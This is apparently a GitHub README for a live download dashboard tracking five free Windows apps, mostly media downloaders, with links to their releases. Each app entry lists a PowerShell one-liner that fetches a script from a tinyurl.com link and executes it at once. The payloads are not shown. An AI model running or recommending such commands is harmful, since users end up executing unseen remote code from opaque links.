# 5 Free Apps Bundle

<p align="center">
  <b>Live download dashboard</b> tracking 5 free open-source Windows apps. Data is fetched live from the GitHub API — no manual updates needed.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Projects-5-0db7ed?style=flat-square" alt="5 projects">
  <img src="https://img.shields.io/badge/Updated-Live%20API-ff4444?style=flat-square" alt="Live API">
</p>

---

## Tracked Projects

Each release ships two `.exe` variants — **Setup** (installer) and **Portable** (standalone). The download count shown is the sum of both.

<table>
  <tr>
    <td width="180"><b>YouTube Downloader</b></td>
    <td>
      <img src="https://img.shields.io/github/downloads/eaeoz/youtube-downloader/total?style=flat-square&label=Downloads&color=ff4444" alt="Downloads">
      <img src="https://img.shields.io/github/v/release/eaeoz/youtube-downloader?style=flat-square&label=Latest&color=ff4444" alt="Latest">
      <br>
      <code>iex (iwr -useb https://tinyurl.com/ytdlps1)</code>
    </td>
  </tr>
  <tr>
    <td width="180"><b>Movie Downloader</b></td>
    <td>
      <img src="https://img.shields.io/github/downloads/eaeoz/movie-downloader/total?style=flat-square&label=Downloads&color=a855f7" alt="Downloads">
      <img src="https://img.shields.io/github/v/release/eaeoz/movie-downloader?style=flat-square&label=Latest&color=a855f7" alt="Latest">
      <br>
      <code>iex (iwr -useb https://tinyurl.com/mvdlps1)</code>
    </td>
  </tr>
  <tr>
    <td width="180"><b>Music Downloader</b></td>
    <td>
      <img src="https://img.shields.io/github/downloads/eaeoz/music-downloader/total?style=flat-square&label=Downloads&color=1ed760" alt="Downloads">
      <img src="https://img.shields.io/github/v/release/eaeoz/music-downloader?style=flat-square&label=Latest&color=1ed760" alt="Latest">
      <br>
      <code>iex (iwr -useb https://tinyurl.com/msdlps1)</code>
    </td>
  </tr>
  <tr>
    <td width="180"><b>Command Manager</b></td>
    <td>
      <img src="https://img.shields.io/github/downloads/eaeoz/command-manager-docker/total?style=flat-square&label=Downloads&color=0db7ed" alt="Downloads">
      <img src="https://img.shields.io/github/v/release/eaeoz/command-manager-docker?style=flat-square&label=Latest&color=0db7ed" alt="Latest">
      <br>
      <code>iex (iwr -useb https://tinyurl.com/cmmgrps1)</code>
    </td>
  </tr>
  <tr>
    <td width="180"><b>Sondakika</b></td>
    <td>
      <img src="https://img.shields.io/github/downloads/eaeoz/sondakika/total?style=flat-square&label=Downloads&color=f59e0b" alt="Downloads">
      <img src="https://img.shields.io/github/v/release/eaeoz/sondakika?style=flat-square&label=Latest&color=f59e0b" alt="Latest">
      <br>
      <code>iex (iwr -useb https://tinyurl.com/sndkkps1)</code>
    </td>
  </tr>
</table>

---

## Dashboard

Open [`index.html`](index.html) in any browser — no server required. The page fetches live release data from:

```
https://raw.githubusercontent.com/eaeoz/app-stats/main/public/releases.json
```

Each repo card displays:

- Avatar & app icon
- **Total downloads** (Setup + Portable across all releases)
- **Release count** (number of unique tags with `.exe` assets)
- Star count from GitHub
- One-click install command
- Latest `.exe` assets — each row is a clickable download link showing file name, size, and per-asset download count
- **Older releases** collapsible section with the same info

## Editing

To add or modify repos, edit the `REPOS` array and `META` map in `index.html`. Each `META` entry requires a `label`, `icon` (SVG string), `accent` color, and `cmd` install command.
